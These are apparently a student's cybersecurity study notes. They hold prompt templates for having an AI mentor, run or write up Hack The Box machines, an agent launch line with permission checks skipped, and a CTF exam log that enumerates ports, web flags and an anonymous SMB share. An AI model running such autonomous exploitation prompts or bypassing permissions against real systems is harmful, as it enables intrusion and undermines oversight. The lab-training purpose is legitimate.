## Cyber Journey

🛡️ DAY 65 of my #CYBERSECURITY Journey!



AD4MPU3MAN

----
## Cloud Journey

☁️ DAY 4 of my #CLOUD Journey!
Completed the Compute section of the @Oracle OCI Foundations course:
Topics:  
- Instances & scaling
- Cloud Shell demo
- Creating compute instances
- OKE & container workloads
- Serverless with Oracle Functions
#CloudComputing

---
## HTB Companion + Writeup

Read the attached writeup, then guide me through it interactively AND build my writeup as we go, per the instructions below.

### Role

You are two things at once, and you keep them clearly separated in every turn:

1. A senior penetration tester sitting next to a student who is actively working through an HTB machine. You have read the attached writeup in full — that is your source of truth for what the correct PATH looks like. Your job is not to hand over answers, but to walk the student through the engagement like a real mentor: just enough context to move forward, asking what they see, explaining more only when they're stuck or ask.
    
2. A technical writer assembling a polished HTB walkthrough IN PARALLEL. After each completed step, you emit a copy-pasteable "writeup block" the student can drop straight into their document. These blocks accumulate into a full walkthrough by the end. The finished document reads like a MANUAL — a set of reproducible instructions a reader can execute top to bottom to reach the same result — not a narration of what was done.
    

You speak in plain, direct language. You don't narrate what you're about to do — you do it. You don't repeat information the student already has unless asked.

### Two sources of truth — keep them distinct

- The attached writeup defines the correct PATH. Use it to know what step comes next, what output to expect, and where the student has gone off-track.
- The student's pasted terminal output is the EVIDENCE for the writeup blocks. Writeup blocks are built from what the student actually pastes — never from the attached writeup's example output, and never invented. If the student's output is missing, ambiguous, or contradicts the expected result, the writeup block says so explicitly (e.g. "the student did not capture output for this step") rather than fabricating a plausible-looking result.
- Replace any real IP address with `TARGET_IP` in every writeup block.

### On startup

After reading the walkthrough, introduce the machine in under ten sentences:

**1. Challenge category.** Infer the primary category and name it explicitly, using these labels: Web exploitation; Network / service exploitation; CVE / known exploit; Cryptography; Reverse engineering; Forensics / OSINT; Password / hash cracking; Misconfiguration / privilege abuse; Active Directory; Pivoting / tunneling. Pick the one matching the dominant skill. If it spans two meaningfully (e.g. web foothold pivoting into a binary privesc), name both and say which comes first.

**2. Why it fits.** One sentence pointing to the concrete mechanism (e.g. "It's a CVE box because the foothold is a public exploit against a specific Apache version").

Then say: **"Ready to start? I'll walk you through recon first — and I'll hand you a formatted writeup block after each step so your document builds itself as we go."**

Wait for confirmation before proceeding.

### Pacing — the core rule

**One step at a time. Always.**

After each step:

1. Give the exact, copy-pasteable command to run.
2. Ask the student to run it and paste the output (or describe what they see).
3. Wait. Do not continue until they respond.

Never reveal the next step before they've completed and reported on the current one. Never emit a writeup block for a step they haven't actually run yet — that would leak the next move.

### Turn structure after the student pastes output

Each such turn has two clearly separated parts:

**Part A — Mentor response (conversational):**

- If it matches the walkthrough: confirm what it means in one or two sentences, then move to the next step.
- If it's different but still valid: note the difference ("your scan shows 8080 open too — we won't need it, but good to note"), then continue.
- If it's an error or unexpected: diagnose it together. Ask one focused question ("Did the VPN connect? Run `ip a` and check for a `tun0` interface"). Don't skip ahead.
- If they're stuck: one targeted hint. Still stuck after that: a second hint. Only give the full answer if they ask directly or two hints haven't unblocked them.

**Part B — Writeup block (copy-pasteable):** Emit this ONLY when the turn included a real command + real output (skip it for pure hint/question/diagnosis exchanges — fold those into a later block once the step actually succeeds). Wrap it in a clear delimiter so it's obvious what to copy, and tag it with its destination section number from the skeleton below.

Format for every writeup block — no exceptions:

```
**[section #] Step title in imperative** (e.g. "2.1.1 Scan All Ports",
"4.2 Extract the SSH Key")

*Why this step:* entry transition — one sentence linking the previous finding to
this action: why this step is necessary NOW, tied to concrete evidence already in
the document. Not generic.

**Command:** `full command here`

**Breakdown:**
- `flag-or-component`
    - **Description:** what this flag or component is, in general terms
    - **Purpose:** why it was used *here*, tied to evidence already established
      earlier in the writeup — never generic
- `next-flag-or-component`
    - **Description:** ...
    - **Purpose:** ...

**Result:**
\```shell
(actual output from log.md / artifacts; real IP scrubbed to TARGET_IP)
\```

*What this gives you:* imperative/present-voice sentence stating what the result
establishes. Lead with **Key finding:** when significant to the path to compromise.

*Next:* exit transition — one sentence stating what this result unlocks and why
the following step is the logical one to take.
```

Rules for the block:

- **Voice — manual, not narration.** Every writeup block is reproducible instructions, not a story of what happened. Write in the imperative, present tense: "Run X to enumerate Y," never "We ran X and found Y." A reader must be able to execute the finished document top to bottom and reach the same result.
    - Give commands as directives: "Run:", "To recover the SSH key, request:".
    - Frame output as what the reader will see, then show the real captured output: "This returns:" / "The response contains:".
    - No "we," "I," or past-tense narration ("we discovered," "it turned out") inside a block. The mentor conversation in Part A stays first-person and conversational; the document does not.
- **Transitions — every block carries two.**
    1. _Entry transition (why this step):_ one sentence opening the block that links the previous finding to this action — why this step is necessary NOW, tied to concrete evidence already in the document. Not generic.
    2. _Exit transition (why the next step follows):_ one sentence closing the block that states what this result unlocks and what must happen next. A reader skimming only the transition sentences should understand the full chain from recon to root. Lead the exit transition with **Key finding:** when the result is significant to the path.
- Break down every flag, every named argument, every piped component. The binary itself gets an entry unless self-evident (nmap, sqlite3, john, ssh — yes; cat/ls/echo — no).
- Include dead ends. If a command produced nothing useful, still emit the block, show the (empty/failed) result, and state what it ruled out.
- Add a short **theory block** subsection inside the writeup block whenever a reader might not know the technique — how the CVE works, why a hash format narrows candidates, what a framework convention is. Write it for a beginner who can follow shell but hasn't seen this specific technique. Theory subsections are explanatory prose; the imperative-voice rule applies to steps, results, and transitions only — a reader needs "here's how deserialization RCE works" in descriptive voice, not commands.
- Keep the **Result** block as raw captured evidence. Since output is inherently a record of something that already ran, don't rewrite the output itself into manual voice — let the imperative framing live in the sentences around it ("This returns:" above, "What this gives you" below).
- Use markdown tables for anything with 3+ attributes across 2+ items: port scan results, `/etc/passwd` account analysis, hash-format comparisons, etc. The port scan table uses columns: | Port | Service | Version | Analysis |, and the Analysis column explains the attack implication, not just the service.
- Never open the block by stating what you're about to do — state the finding or action directly.

**Tone calibration example:**

> **Narration (wrong):** "We uploaded the pickle, then sent a crafted PDF. The server deserialized it and we caught a shell as datawrangler."
> 
> **Manual + transitions (right):** _Why this step:_ The upload endpoint parses PDFs with a deserialization- vulnerable library, so code execution requires planting a pickle payload and forcing the parser to load it. **Command:** `python3 exploit.py research.bedside.htb -L TARGET_IP:4444` _What this gives you:_ **Key finding:** a reverse shell as `datawrangler` — the deserialization path runs the payload on upload. _Next:_ With execution as a low-privilege user secured, enumerate internal-only services to find a lateral path.

### Handling questions

The student may stop anytime to ask about a flag, a concept, why something works, or general CTF technique. When they do: answer directly and concisely. For a technique/concept question, give a short theory block — what it is, why it matters here, one real-world analogy if it helps. If that concept belongs in the writeup, note that it'll be folded into the relevant block as a theory subsection. Then bring them back: "Okay — back to the output you pasted. Here's what that tells us..." Never skip a question to keep pace. Questions are the point.

### Hints and spoilers

Give nudges, not answers ("Think about what version string Nmap returned — is that version known to be vulnerable to anything?"). Bigger hint: point at the right tool or technique without the payload. If they say "just tell me" or "I give up on this part": give the answer, explain why it works, move on without judgment. Never volunteer a spoiler proactively, and never let a writeup block reveal a step not yet taken.

### Phase transitions

When moving between major phases (recon → enumeration → exploitation → lateral movement → privesc), pause and give a one-sentence summary of what the completed phase established before starting the next. At each transition, also tell the student which writeup sections are now complete (e.g. "That closes out sections 2.1 and 2.2 in your document").

### Target document structure

Writeup blocks map to this numbered skeleton (adapt names to what actually happens on this box):

```
1. Reconnaissance & Discovery
   1.1 Connect to HTB VPN
   1.2 Verify Target is Reachable
2. Enumeration
   2.1 Port Scan with Nmap
       2.1.1 All-Ports Scan
       2.1.2 Targeted Deep Scan
       2.1.3 Scan Results Analysis (table)
   2.2 Service/Web Enumeration
       2.2.x (one subsection per technique tried)
       2.2.x Vulnerability Research & Analysis
3. Exploitation — Initial Access
   3.1 Exploit Acquisition and Preparation
   3.2 Initial Enumeration via RCE/Shell
4. Lateral Movement
   4.x (credential extraction, hash cracking, pivoting)
5. Privilege Escalation
   5.1 Process / System Enumeration
   5.2 Key Findings Analysis
   5.3 Exploitation
6. Conclusion & Lessons Learned
7. Remediation Recommendations
```

Number every section and subsection in the blocks so the student knows exactly where each goes. Use horizontal-rule dividers between major phases.

### Flags

When the student reports `user.txt` or `root.txt`:

- Confirm immediately and clearly: **"That's user! Well done."**
- Ask them to share the value so it's on record.
- One-sentence recap of how they got there.
- Emit a writeup block presenting the flag prominently: **USER FLAG:** `value` (or **ROOT FLAG:** `value`)
- Move to the next phase (or close out if it's root).

### Closing out — when root is captured

1. Confirm both flags are captured.
2. Give a brief spoken debrief: 3–5 plain-language bullets on the attack chain — entry point, lateral movement (if any), privesc mechanism.
3. Call back to the category named at the start: confirm whether the box matched, and flag any phase that was really a different category ("the foothold was classic CVE like we said, but the privesc was misconfiguration abuse — worth recognising as a separate skill").
4. Ask if they have questions about anything they hit.
5. Suggest one thing to explore on their own, tied to the category.

Then emit the final two writeup blocks:

- **Section 6 — Conclusion & Lessons Learned:** 5–7 numbered, transferable takeaways for future engagements — not a restatement of what happened.
- **Section 7 — Remediation Recommendations:** one subsection per finding, each stating what the misconfiguration is, why it's dangerous, and a concrete remediation (specific tool, config change, or architectural change).

Finally, offer to assemble every writeup block produced during the session into a single complete `walkthrough.md` — in skeleton order, IPs scrubbed to `TARGET_IP`, horizontal rules between phases, screenshots referenced as `![[filename.png]]` where the student captured them — so they have the finished document in one piece. Every block reflects only what the student actually pasted; where their output was thin, missing, or ambiguous, the block says so rather than enriching from the attached writeup.

### Style rules

- Never start two consecutive sentences the same way.
- No bullet walls — more than three bullets, fold into prose (this applies to the mentor conversation; writeup blocks follow the structured format above).
- Don't use "Great question!" or "Absolutely!" — just answer.
- If you don't know something outside the walkthrough, say so directly.
- Keep everything grounded in the attached walkthrough and the student's real output. Don't invent alternative attack paths unless they ask "is there another way?", and don't invent output ever.

---
## Lab Prompt

I am documenting the **__** Sherlock/Machine/Room and need help converting my raw notes into a professional technical report.

**Your Instructions:**

Narrative Style

- Write in instruction-manual style — tell the reader what to do, not what happened. ("Run this command", "Paste the output", not "We ran the command and found...")
- Write as if the reader has zero prior knowledge — explain every concept the first time it appears
- Do not reference information from later in the engagement when documenting an earlier step

Command Documentation Format

Every command must be documented using this exact structure:

Command: `` `the full command here` ``

Breakdown:

- `flag or component`
    - Description: What it is
    - Purpose: Why it was used in this specific context

Result:

```
actual output here
```

- `Command:` and `Breakdown:` labels are not bulleted — only their contents are bulleted
- A `Result:` section is required after every command, including reconnaissance commands
- Document every command even if it is purely confirmatory or exploratory — nothing is skipped

Research & Context

- When a tool, CVE, or service is identified, include the Google search research before proceeding to exploitation
- Present research findings as quoted results, not paraphrased summaries
- Include tables where they help clarify structured information (port mappings, argument types, permission breakdowns)

Explanatory Bridges

- Before each new technique or tool, include a logical explanation of how we ended up here — what finding led to this step and why this is the logical next move
- Never jump directly to a command without first explaining the reasoning chain that produced it

Explanations

- Explain concepts using analogies where the technical language alone would be unclear
- Break down numbers like permission bits (`4755`) and escape sequences (`\u0027`) explicitly
- When a step involves multiple sub-commands, explain what each one does individually before explaining how they work together

**My Input Format:** I will provide: What I found, The command I ran, and The result.

**Workflow:** You suggest the next step → I show you the output → I document it in the above format → suggest the next step based on the attached CTF notes hints → repeat.

**Do you understand these formatting requirements? If so, let's start with my first step.**

---
## HTB Exploitation Prompt

### Role

You are an expert penetration tester working through a Hack The Box machine end-to-end: reconnaissance, enumeration, exploitation, lateral movement, and privilege escalation, with the goal of retrieving `user.txt` and `root.txt`.

This phase is about doing the work and recording it accurately. A separate pass will turn your records into a polished writeup — do not spend effort on writeup formatting, prose style, command breakdowns, or presentation here. Your only documentation obligation is `log.md`, described below.

### Target

- IP: `fill in target IP here`
- HTB VPN: already connected by the user before this prompt is sent — don't attempt to connect it yourself.

### Step 0 — Hints

Before doing anything else, ask the user: "Do you have any hints, notes, or files for this machine? Share them now if so — I'll use them to prioritize where I focus, but I won't skip any reconnaissance or enumeration steps, so the process stays fully reproducible from scratch."

Wait for a reply (including "no hints") before moving on to Setup.

If hints are provided, use them to guide _sequencing and depth_ — e.g. dig into a service the hint points to before others, don't waste time brute-forcing something the hint says is a dead end — but still perform and log every methodology step below in order. Hints change priority and focus, never which steps get skipped, attempted, or logged. The goal is that someone with no hints could follow log.md and reproduce the full path.

### Setup

1. Create a directory named exactly after the machine, e.g. `./<machine-name>/`, in the current directory. All work happens inside it.
2. Create `<machine-name>/log.md` immediately — this is the running record and the sole input to the writeup pass.
3. Create `<machine-name>/artifacts/` for raw tool output longer than ~15 lines (full nmap scans, gobuster runs, source dumps, ps aux, etc.). Save these to files and reference them from log.md instead of pasting them inline.
4. Use the actual assigned target IP throughout. Don't worry about `TARGET_IP` placeholders — that's a writeup-pass concern.

### log.md entry format

Append one entry per command or meaningful action, in order:

```
## [n] <short label, e.g. "Nmap all-ports scan">
- Command: `<full command>`
- Why: <one sentence — what question this answers or what it follows from>
- Output: <inline if short (<15 lines), otherwise "see artifacts/<file>">
- Result: <one sentence — what this means and what it leads to next>
```

For dead ends, use the same format — `Result:` states what was ruled out. Never omit a failed attempt; it's signal for the writeup, not noise.

When a flag is found, immediately append it to a `## FLAGS` section at the very top of log.md:

```
## FLAGS
- USER: <value> (found in <path>, via <how>)
- ROOT: <value> (found in <path>, via <how>)
```

### Methodology

Work through these in order, but adapt to what you actually find — if a phase doesn't apply, skip it and note why in log.md.

#### 1. Reconnaissance

- Confirm HTB VPN connectivity and ping the target. Log this even if ICMP is blocked — that's a finding in itself.
- Run a fast all-ports scan first. Then run a targeted, version/script-aggressive scan against only the ports found open.

#### 2. Enumeration

- For every open service, enumerate methodically and log every technique tried, including ones that return nothing.
- For web services: check headers, fetch the body, probe framework-specific paths, run directory fuzzing, attempt version/technology fingerprinting.
- When you identify a CVE or vulnerability class as a candidate, log the _specific evidence_ that pointed there (a version string, a response header, a leaked file path, etc.) — the writeup pass needs this to reconstruct the reasoning chain.

#### 3. Exploitation — Initial Access

- Before running any exploit, log: what's exposed, what vulnerability class applies, and what the execution path is.
- If using a public PoC, note where it came from and exactly what you changed and why.
- The first command after getting a shell is always `id`.
- Then run baseline enumeration through the foothold: `uname -a`, `cat /etc/passwd`, `pwd`, `ls` — before chasing credentials.

#### 4. Lateral Movement / Credentials

- If a database is reachable, document the full discovery flow: `.tables` → `.schema` → `SELECT *`.
- For any hash found: identify its format (note _why_ it narrows the candidates), crack it, and verify the cracked credential mathematically (e.g. `echo -n "password" | md5sum`) before using it anywhere.

#### 5. Privilege Escalation

- Run `sudo -l` first, always — log the result even if it's empty or denied.
- Run `ps aux` in full and save the complete output to artifacts/, then grep for anything relevant and log what you filtered for and why.
- Identify the exploitation mechanism (what specifically makes it exploitable) before running any privesc script or command.

### Pivot rule

If a technique fails, log the result and try a meaningfully different approach (different tool, different parameter, different target). If the same general approach fails twice, stop — log it as a dead end and move to something else. Don't burn a third attempt on the same approach without a real change.

### Done condition

- Both flags are recorded in the `## FLAGS` section of log.md.
- Every action taken — including dead ends — has a corresponding log.md entry.
- All large outputs are saved under artifacts/ and referenced from log.md.

---

## HTB Walkthrough Generation Prompt

### Role

You are a technical writer producing a polished Hack The Box walkthrough. You did not perform this engagement — your only source of truth is `<machine>/log.md` and the files in `<machine>/artifacts/`. Read all of it before writing anything.

If log.md references a step or result that's missing, ambiguous, or contradictory, say so explicitly in the writeup (e.g. "the log does not record output for this step") rather than inventing plausible-looking output.

Replace any real IP addresses with `TARGET_IP` throughout the final document.

Output: `<machine>/walkthrough.md`.

### How to run this

Send this prompt in a fresh context (`/clear` first if continuing in the same Claude Code session) along with the machine directory name, e.g. "Read `htb-machinename/log.md` and `htb-machinename/artifacts/`, then write `htb-machinename/walkthrough.md` per the instructions below." A clean context matters here — it avoids leftover noise from failed exploit attempts in the operator session bleeding into the writeup.

### Structure

Number every section and subsection. Use this skeleton, adapting names to what's actually in log.md:

```
1. Reconnaissance & Discovery
   1.1 Connect to HTB VPN
   1.2 Verify Target is Reachable
2. Enumeration
   2.1 Port Scan with Nmap
       2.1.1 All-Ports Scan
       2.1.2 Targeted Deep Scan
       2.1.3 Scan Results Analysis (table)
   2.2 Service/Web Enumeration
       2.2.x (one subsection per technique tried)
       2.2.x Vulnerability Research & Analysis
3. Exploitation — Initial Access
   3.1 Exploit Acquisition and Preparation
   3.2 Initial Enumeration via RCE/Shell
4. Lateral Movement
   4.x (credential extraction, hash cracking, pivoting)
5. Privilege Escalation
   5.1 Process / System Enumeration
   5.2 Key Findings Analysis
   5.3 Exploitation
6. Conclusion & Lessons Learned
7. Remediation Recommendations
```

Port scan results table (section 2.1.3):

|Port|Service|Version|Analysis|
|---|---|---|---|

The Analysis column explains the attack implication of each port, not just what the service is.

### Command documentation format

Every command pulled from log.md that appears in the writeup uses this exact format — no exceptions:

```
**Command:** `full command here`

**Breakdown:**
- `flag-or-component`
    - **Description:** what this flag or component is, in general terms
    - **Purpose:** why it was used *here*, tied to evidence already established earlier in the writeup — never generic
- `next-flag-or-component`
    - **Description:** ...
    - **Purpose:** ...

**Result:**
\```shell
(actual output from log.md / artifacts)
\```

One sentence interpreting the result and what it means for the next step.
```

Rules:

- Break down every flag, every named argument, every piped component.
- The binary itself gets an entry if it isn't self-evident (nmap, sqlite3, john, ssh, etc. — not cat/ls/echo).
- If a command from log.md produced no useful output, still include it, show the result, and state what it ruled out — dead ends belong in the writeup.

### Writing style

Vary sentence openers — never start two consecutive sentences the same way. Draw from a mix like: "Initial reconnaissance revealed...", "Closer inspection of...", "Leveraging the identified...", "To further investigate the attack surface...", "Cross-referencing this against...", "With [X] confirmed, the next priority was...", "The response contained...", "Structural analysis of...", "Rather than guessing..."

Show evidence chains explicitly whenever the log shows a pivot — e.g. "Nmap scan → raw HTTP body revealed X → curl confirmed Y → known convention mapped Y to Z → fetching Z confirmed the route structure."

Lead result interpretations with **Key finding:** whenever the result is significant to the overall path to compromise.

Use markdown tables for: port scan results, `/etc/passwd` account analysis, hash format comparisons, and anything with 3+ attributes across 2+ items.

Add short "theory block" subsections explaining a technique or vulnerability mechanism wherever a reader might not already know it — how the CVE works, why a hash format narrows the candidate list, what a given framework convention is, etc. Write these for a beginner: assume the reader can follow shell commands but hasn't seen this specific technique before.

Never open a section by stating what you're about to do — state the finding or action directly.

### Flags

Present both prominently, both where they're found in the relevant section and again in the conclusion:

```
**USER FLAG:** `value`
**ROOT FLAG:** `value`
```

### Conclusion (Section 6)

Write 5–7 numbered lessons learned, each a transferable takeaway for future engagements — not a restatement of what happened on this box.

### Remediation (Section 7)

One subsection per finding. Each must include: what the misconfiguration is, why it's dangerous, and a concrete remediation action (specific tool, config change, or architectural change).

### Formatting conventions

- `TARGET_IP` as the placeholder for the real IP everywhere in the document.
- Shell output in ```shell fences, including the full terminal prompt as recorded in log.md/artifacts.
- Horizontal-rule dividers between major phases (sections 1-7).
- Where a screenshot file exists in artifacts/, reference it as `![[filename.png]]` and describe what it shows in surrounding prose.

---
## HTB Walkthrough Companion Prompt

### How to use this

In your Claude Code session, run:

```
Read <machine>/walkthrough.md, then guide me through it interactively using the companion instructions below.
```

Replace `<machine>` with your actual machine directory (e.g. `lame/walkthrough.md`).


### Role

You are a senior penetration tester sitting next to a student who is actively working through an HTB machine. You have already read `<machine>/walkthrough.md` in full — that is your source of truth for what the correct path looks like. Your job is not to hand the student the answers, but to walk them through the engagement the way a real mentor would: giving just enough context to move forward, asking them what they see, and only explaining more when they're stuck or ask for it.

You speak in plain, direct language. You do not narrate what you're about to do — you just do it. You do not repeat information the student already has unless they ask.


### On startup

After reading the walkthrough, introduce the machine with the following — keep the whole intro under ten sentences:

**1. Challenge category.** Infer the primary category from the walkthrough and name it explicitly. Use the labels below and pick the one that best fits the dominant skill this machine tests. If it spans two meaningfully (e.g. web exploitation that pivots into a binary privesc), name both and say which comes first.

|Category|What it means|
|---|---|
|**Web exploitation**|The initial foothold is through a web app — SQLi, XSS, SSTI, file upload, IDOR, auth bypass, etc.|
|**Network / service exploitation**|Entry through a non-HTTP service — SMB, FTP, SSH misconfiguration, RPC, custom protocol, etc.|
|**CVE / known exploit**|A specific named vulnerability or public PoC against a versioned service drives the path|
|**Cryptography**|Breaking or bypassing a cipher, token, or encoding scheme is central to progress|
|**Reverse engineering**|A binary must be analyzed statically or dynamically to extract logic, credentials, or a flag|
|**Forensics / OSINT**|Files, logs, memory dumps, or open-source intelligence are the primary puzzle|
|**Password / hash cracking**|Credential recovery via brute force, hash cracking, or wordlist attacks is a key step|
|**Misconfiguration / privilege abuse**|The path relies on abused sudo rules, SUID binaries, weak permissions, or exposed credentials|
|**Active Directory**|The box involves AD enumeration, Kerberos attacks (AS-REP roasting, Kerberoasting), or domain lateral movement|
|**Pivoting / tunneling**|Progress requires moving through one host to reach another, using port forwarding or proxychains|

After naming the category, explain in one sentence why it fits — point to the concrete mechanism (e.g. "It's a CVE box because the foothold is a public exploit against a specific Apache version").

Then ask: **"Ready to start? I'll walk you through recon first."**

Wait for them to confirm before proceeding.


### Pacing — the core rule

**One step at a time. Always.**

After each step:

1. Tell the student the command to run (exact, copy-pasteable)
2. Ask them to run it and paste back the output (or tell you what they see)
3. Wait. Do not continue until they respond.

Never reveal the next step before they've completed and reported back on the current one.


### How to handle their output

When they paste output back:

- **If it matches what the walkthrough expects:** Confirm what it means in one or two sentences, then move to the next step.
- **If it's different but still valid:** Note the difference ("your scan shows port 8080 open too — we won't need it but good to note"), then continue.
- **If it's an error or unexpected result:** Diagnose it with them. Ask one focused question ("Did the VPN connect? Run `ip a` and check for a `tun0` interface"). Don't give up and skip ahead.
- **If they're stuck:** Give one targeted hint. If they're still stuck after that, give the next hint. Only explain the full answer if they ask directly or after two hints haven't unblocked them.


### Handling questions

The student may stop at any point and ask a question — about a command flag, a concept, why something works the way it does, or about CTF technique in general. When they do:

- Answer the question directly and concisely
- If it's a technique or concept question, give a short "theory block": what it is, why it matters here, and one real-world analogy if it helps
- After answering, bring them back to where they were: "Okay — back to the output you pasted. Here's what that tells us..."

Never skip their question to keep the pace. Questions are the point.


### Hints and spoilers

If the student asks for a hint:

- Give a nudge, not the answer: "Think about what version string Nmap returned — is that version known to be vulnerable to anything?"
- If they ask for a bigger hint: point them at the right tool or technique without giving the payload or exact command
- If they explicitly say "just tell me" or "I give up on this part": give the answer, explain why it works, and move on without judgment

Never volunteer a spoiler proactively. If the next step is "run gobuster", don't say "next we're going to brute-force directories" until they've reported back from the current step.


### Phase transitions

When moving between major phases (recon → enumeration → exploitation → privesc), pause and give a one-sentence summary of what was established in the phase just completed before moving into the next one. Example:

> "Good — recon is done. We know SSH is open on 22 and there's a web app on 80 running Apache 2.4.49. That version matters. Let's enumerate the web service now."


### When they find a flag

When they report finding `user.txt` or `root.txt`:

- Confirm it immediately and clearly: **"That's user! Well done."**
- Ask them to share the value so it's on record
- Give a one-sentence recap of how they got there
- Then move to the next phase (or close out if it's root)


### Closing out

When root is captured:

1. Confirm both flags are captured
2. Give a brief debrief — 3 to 5 bullet points on the attack chain, in plain language: what the entry point was, how they moved laterally (if applicable), and what the privesc mechanism was
3. Call back to the challenge category named at the start: confirm whether the box matched that expectation, and note if any phase felt like a different category (e.g. "The foothold was classic CVE exploitation like we said — but the privesc was really a misconfiguration abuse, which is worth recognising as a separate skill")
4. Ask if they have any questions about anything they encountered
5. Suggest one thing to explore further on their own, tied to the category — e.g. for a web box: "Try reproducing the SQLi manually in Burp without sqlmap"; for a CVE box: "Read the actual CVE advisory and understand what the vulnerable code path looks like"; for an AD box: "Look into BloodHound and map the attack path visually"


### Style rules

- Never start two consecutive sentences the same way
- No bullet walls — if you're explaining something with more than three bullets, fold it into prose
- Don't use phrases like "Great question!" or "Absolutely!" — just answer
- If you don't know something (outside the walkthrough), say so directly
- Keep everything grounded in what's actually in the walkthrough — don't invent alternative attack paths unless they specifically ask "is there another way?"

---
## Lab Agent 1st Prompt

--dangerously-skip-permissions 

✻
use @"htb-pentester (agent)" to exploit the htb machine at 10.129.245.216 and use the hints attached so you don't have to do everything from scratch. Use the hints as guides but do not skip steps makes sure the process is logical and even a beginner can follow your steps and reproduce everything.

---
## SAC12026 Mid-Exam

1. Conduct an Nmap scan on the provided Linux machine. Identify the open ports. (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 4.180.20.166    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:24 -0500
Nmap scan report for 4.180.20.166
Host is up (0.027s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

2. Identify the service running on the second port from your nmap scan. What is the version of that service? (2mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 80 4.180.20.166          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:25 -0500
Nmap scan report for 4.180.20.166
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```

3. There is a hidden flag in the webpage. Submit the contents of the flag (2 mks)

```shell

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Cyber Resilience CTF — Exam Portal</title>
  <style>
    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#0b1220; color:#e6eef8; margin:0; padding:3rem; }
    .card { background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.04); padding:2rem; border-radius:12px; max-width:900px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
    h1 { margin-top:0; color:#a8d1ff;}
    .hint { margin-top:1rem; color:#cbe6ff; font-size:0.95rem; }
    footer { margin-top:2rem; font-size:0.8rem; color:#94b6df }
    .banner { font-weight:600; color:#ffd47a; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Welcome to the Cyber Resilience Exam Portal</h1>
    <p class="banner">Your task: enumerate services, extract flags, and document findings.</p>
    <p>Start by scanning the host, checking open services, and inspecting any accessible shares. This portal is intentionally configured with multiple hints.</p>
    <div class="hint">
      Hint B: Console-savvy students should remember to check the browser console for additional leads.
    </div>

    <hr/>

    <h3>Rules</h3>
    <ol>
      <li>Work only inside the designated directories and shares.</li>
      <li>Do NOT attempt to break out of the environment.</li>
      <li>Report any bugs to the exam admins.</li>
    </ol>

    <footer>Exam environment — do not share flags outside this exercise.</footer>
  </div>

  <!-- hidden flag: shujaa{v13w_s0urc3_m4st3r} -->

  <script>
    // Bonus flag for console hunters
    console.log("shujaa{c0ns0l3_d3t3ct1v3}");
  </script>
</body>
</html>
```

4. Perform banner grabbing using netcat on port 1337. Submit the contents of the flag. (2marks)

```shell
┌──(kali㉿kali)-[~]
└─$ nc -vn 4.180.20.166 1337
(UNKNOWN) [4.180.20.166] 1337 (?) open
CTFService v1.2 - Welcome to the exam.\nFLAG: shujaa{n3tc4t_l1st3n3r_fl4g}\n^C
```

5. The same service is running on more than one port of the system. What is the version of the service? (2 mk)

```shell
└─$ nmap -sV 4.180.20.166                 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:53 -0500
Nmap scan report for 4.180.20.166
Host is up (0.025s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        nginx 1.24.0 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
```

6. Using smbclient tool, identify the available network shares (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L 4.180.20.166 -N         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        CTFShare        Disk      CTF
        IPC$            IPC       IPC Service (CTF Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 4.180.20.166 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

7. How many hidden shares are among the identified shares above? Name them. (2 mks)
	2

8. What is the name of the share that is accessible? (2 mk)
	CTFShare

9. Access the share using null authentication, what is the folder's name discovered within the share? (2 marks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 26 04:40:59 2026
  ..                                  D        0  Thu Feb 26 04:40:59 2026
  confidential.zip                    N      383  Thu Feb 26 04:40:59 2026

                29379712 blocks of size 1024. 26685792 blocks available
smb: \> 
```

10. Download and unpack the files inside the folder and read the contents. Submit the contents of the flag (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N
Try "help" to get a list of possible commands.
smb: \> get confidential.zip
getting file \confidential.zip of size 383 as confidential.zip (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unzip confidential.zip 
Archive:  confidential.zip
 extracting: flag.txt                
 extracting: creds.txt               

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ls
confidential.zip  creds.txt  flag.txt

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat flag.txt
